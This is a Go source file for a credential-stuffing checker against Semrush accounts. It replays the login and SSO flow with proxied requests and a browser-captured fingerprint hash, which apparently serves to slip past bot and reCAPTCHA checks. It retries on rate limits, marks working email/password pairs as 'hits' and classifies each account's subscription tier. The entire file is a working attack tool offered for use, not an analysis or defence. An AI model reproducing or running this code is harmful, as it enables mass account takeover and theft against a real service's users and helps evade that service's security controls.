package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"regexp"
	"strings"
)

var semrushPlanRE = regexp.MustCompile(`"(?:plan|product|subscription|toolkit|tariff|package)(?:Name|Title|Type|Id)?"\s*:\s*"([^"]{2,80})"`)

func (c *Checker) checkSemrush(email, password string, proxyURL *url.URL) CheckResult {
	result := CheckResult{Email: email, Password: password}

	client, err := c.freshClient(proxyURL)
	if err != nil {
		result.Status = StatusError
		result.Reason = err.Error()
		return result
	}

	uaHash := c.cfg.SemrushUserAgentHash()
	if uaHash == "" {
		result.Status = StatusError
		result.Reason = "missing user_agent_hash in config (FingerprintJS visitorId from browser capture)"
		return result
	}

	loginURL := c.cfg.LoginURL()
	referer := loginURL

	// Step 1: GET login page (session + site_csrftoken cookies)
	_, loginStatus, err := c.fetchURL(client, loginURL, map[string]string{
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"User-Agent": c.cfg.UserAgent,
	})
	if err != nil {
		status, reason := c.resultFromRequestErr("login page", err)
		result.Status = status
		result.Reason = reason
		return result
	}
	if loginStatus == http.StatusTooManyRequests {
		result.Status = StatusRateLimited
		result.Reason = rateLimitReason("login page HTTP 429")
		return result
	}
	if loginStatus != http.StatusOK {
		result.Status = StatusError
		result.Reason = fmt.Sprintf("login page HTTP %d", loginStatus)
		return result
	}

	// Step 2: POST /olaf/init (bot/session bootstrap)
	_, olafStatus, _, err := c.doRequest(client, "POST", c.cfg.SemrushOlafInitURL(), map[string]string{
		"Accept":     "*/*",
		"Origin":     c.cfg.BaseURL(),
		"Referer":    referer,
		"User-Agent": c.cfg.UserAgent,
	}, "")
	if err != nil {
		status, reason := c.resultFromRequestErr("olaf/init", err)
		result.Status = status
		result.Reason = reason
		return result
	}
	if olafStatus == http.StatusTooManyRequests {
		result.Status = StatusRateLimited
		result.Reason = rateLimitReason("olaf/init HTTP 429")
		return result
	}

	// Step 3: POST /sso/options (SSO flags)
	optsBody := fmt.Sprintf(`{"withCredentials":true,"user-agent-hash":%s}`, jsonString(uaHash))
	_, optsStatus, _, err := c.doRequest(client, "POST", c.cfg.SemrushSSOOptionsURL(), map[string]string{
		"Accept":       "application/json, text/plain, */*",
		"Content-Type": "application/json",
		"Origin":       c.cfg.BaseURL(),
		"Referer":      referer,
		"User-Agent":   c.cfg.UserAgent,
	}, optsBody)
	if err != nil {
		status, reason := c.resultFromRequestErr("sso/options", err)
		result.Status = status
		result.Reason = reason
		return result
	}
	if optsStatus == http.StatusTooManyRequests {
		result.Status = StatusRateLimited
		result.Reason = rateLimitReason("sso/options HTTP 429")
		return result
	}

	// Step 4: POST /sso/authorize
	authPayload := map[string]string{
		"locale":                "en",
		"source":                "semrush",
		"g-recaptcha-response":  "",
		"user-agent-hash":       uaHash,
		"email":                 email,
		"password":              password,
	}
	authJSON, _ := json.Marshal(authPayload)
	authBody, authStatus, _, err := c.doRequest(client, "POST", c.cfg.SemrushAuthorizeURL(), map[string]string{
		"Accept":       "application/json, text/plain, */*",
		"Content-Type": "application/json",
		"Origin":       c.cfg.BaseURL(),
		"Referer":      referer,
		"User-Agent":   c.cfg.UserAgent,
	}, string(authJSON))
	if err != nil {
		status, reason := c.resultFromRequestErr("sso/authorize", err)
		result.Status = status
		result.Reason = reason
		return result
	}
	if authStatus == http.StatusTooManyRequests {
		result.Status = StatusRateLimited
		result.Reason = rateLimitReason("sso/authorize HTTP 429")
		return result
	}

	if failReason := parseSemrushAuthFailure(authBody, authStatus); failReason != "" {
		result.Status = StatusFail
		result.Reason = failReason
		return result
	}
	if !semrushAuthSucceeded(authBody, authStatus) {
		result.Status = StatusFail
		result.Reason = fmt.Sprintf("login failed (HTTP %d)", authStatus)
		return result
	}

	result.AccountEmail = email
	if plan, ok := extractSemrushPlanFromJSON(authBody); ok {
		result.PlanName = plan
	}

	// Step 5: fetch dashboard / account page for plan (until dedicated API captured)
	if result.PlanName == "" {
		homeURL := c.cfg.Var("dashboard_url", c.cfg.BaseURL()+"/")
		homeBody, homeStatus, _, err := c.doRequest(client, "GET", homeURL, map[string]string{
			"Accept":     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			"Referer":    referer,
			"User-Agent": c.cfg.UserAgent,
		}, "")
		if err == nil && homeStatus == http.StatusOK {
			if plan, ok := extractSemrushPlanFromHTML(homeBody); ok {
				result.PlanName = plan
			}
		}
	}

	if result.PlanName == "" {
		result.PlanName = "Logged In"
		result.PlanLabel = "UNKNOWN"
		result.Status = StatusHit
		result.Reason = "login ok — plan API not in capture yet; re-capture after opening Subscription Info"
		return result
	}

	result.PlanLabel = classifySemrushPlan(result.PlanName)
	result.Status = StatusHit
	return result
}

func (c *Checker) fetchURL(client *http.Client, rawURL string, headers map[string]string) (string, int, error) {
	retries := c.cfg.Settings.RetryOnError
	if retries < 0 {
		retries = 0
	}
	var body string
	var status int
	var err error
	for attempt := 0; attempt <= retries; attempt++ {
		body, status, _, err = c.doRequest(client, "GET", rawURL, headers, "")
		if err != nil {
			if isRateLimitErr(err) && attempt < retries {
				proxyRetrySleep(attempt)
				continue
			}
			if isRateLimitErr(err) {
				return "", http.StatusTooManyRequests, nil
			}
			return "", 0, err
		}
		if status == http.StatusOK {
			return body, status, nil
		}
		if isRateLimitedStatus(status) && attempt < retries {
			proxyRetrySleep(attempt)
			continue
		}
		return body, status, nil
	}
	return body, status, nil
}

func parseSemrushAuthFailure(body string, status int) string {
	lower := strings.ToLower(body)
	failPhrases := map[string]string{
		"error_invalid_credentials":  "invalid email or password",
		"invalid email or password": "invalid email or password",
		"incorrect email or password": "invalid email or password",
		"error_uahash_invalid":     "invalid user-agent-hash — update user_agent_hash in semrush.json from browser",
		"error_uahash_required":    "missing user-agent-hash",
		"error_recaptcha":          "recaptcha required",
		"recaptcha":                  "recaptcha required",
		"error_token_invalid":        "invalid login token",
		"account locked":             "account locked",
		"too many attempts":          "too many attempts",
	}
	for needle, reason := range failPhrases {
		if strings.Contains(lower, needle) {
			return reason
		}
	}
	if status == http.StatusUnauthorized || status == http.StatusForbidden {
		return "not authenticated"
	}
	if status == http.StatusBadRequest && strings.Contains(lower, "error") {
		if msg, ok := jsonPathString(body, "message"); ok && msg != "" {
			return msg
		}
		if code, ok := jsonPathString(body, "code"); ok && code != "" {
			return code
		}
	}
	return ""
}

func semrushAuthSucceeded(body string, status int) bool {
	if status >= 200 && status < 300 {
		lower := strings.ToLower(body)
		if strings.Contains(lower, `"error"`) && !strings.Contains(lower, `"error":false`) {
			if code, ok := jsonPathString(body, "code"); ok && strings.HasPrefix(strings.ToUpper(code), "ERROR") {
				return false
			}
		}
		if redirect, ok := jsonPathString(body, "redirect"); ok && redirect != "" {
			return true
		}
		if redirect, ok := jsonPathString(body, "redirect_to"); ok && redirect != "" {
			return true
		}
		if okVal, ok := jsonPathString(body, "ok"); ok && okVal == "true" {
			return true
		}
		if success, ok := jsonPathString(body, "success"); ok && success == "true" {
			return true
		}
		return status == http.StatusOK || status == http.StatusNoContent
	}
	return false
}

func extractSemrushPlanFromJSON(body string) (string, bool) {
	for _, path := range []string{
		"subscription.name",
		"subscription.plan",
		"plan.name",
		"planName",
		"product.name",
		"toolkit.name",
		"data.subscription.name",
		"data.plan.name",
	} {
		if val, ok := jsonPathString(body, path); ok && val != "" {
			return val, true
		}
	}
	return "", false
}

func extractSemrushPlanFromHTML(body string) (string, bool) {
	if plan, ok := extractSemrushPlanFromJSON(body); ok {
		return plan, true
	}
	matches := semrushPlanRE.FindAllStringSubmatch(body, -1)
	for _, m := range matches {
		if len(m) >= 2 {
			val := strings.TrimSpace(m[1])
			if val != "" && !strings.EqualFold(val, "null") {
				return val, true
			}
		}
	}
	needles := []string{
		"SEO Pro", "SEO Guru", "Business", "Semrush One", "Content Toolkit",
		"Local Pro", "Local Business", "Free", "Trial",
	}
	lower := strings.ToLower(body)
	for _, n := range needles {
		if strings.Contains(lower, strings.ToLower(n)) {
			return n, true
		}
	}
	return "", false
}

func classifySemrushPlan(planName string) string {
	lower := strings.ToLower(planName)
	switch {
	case strings.Contains(lower, "logged in"):
		return "UNKNOWN"
	case strings.Contains(lower, "trial"):
		return "FREE_TRIAL"
	case strings.Contains(lower, "free"):
		return "FREE"
	case strings.Contains(lower, "business"):
		return "BUSINESS"
	case strings.Contains(lower, "guru"):
		return "GURU"
	case strings.Contains(lower, "pro"):
		return "PRO"
	case strings.Contains(lower, "agency") || strings.Contains(lower, "enterprise"):
		return "ENTERPRISE"
	default:
		return "PAID"
	}
}
